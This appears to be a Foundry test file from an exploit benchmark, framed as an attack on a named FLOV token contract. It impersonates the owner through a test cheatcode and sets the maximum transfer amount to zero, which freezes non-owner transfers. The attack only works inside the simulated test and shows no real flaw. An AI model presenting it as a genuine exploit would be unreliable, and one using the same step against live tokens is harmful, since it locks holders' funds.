pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IFLOV {
    function owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxAmount) external;
    function _maxTxAmount() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCA1E6F584E0d7EEc74F553E9a7B64a4DeD8A4b61;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "FLOV Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        IFLOV flov = IFLOV(TARGET);
        address owner = flov.owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Set max transaction amount to 0 - this blocks all non-owner transfers
        flov.setMaxTxPercent(0);

        vm.stopPrank();

        // Verify the exploit worked - oracle checks _maxTxAmount == 0
        assertEq(flov._maxTxAmount(), 0, "Max tx amount should be 0");
        assertEq(flov._maxTxAmount(), 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

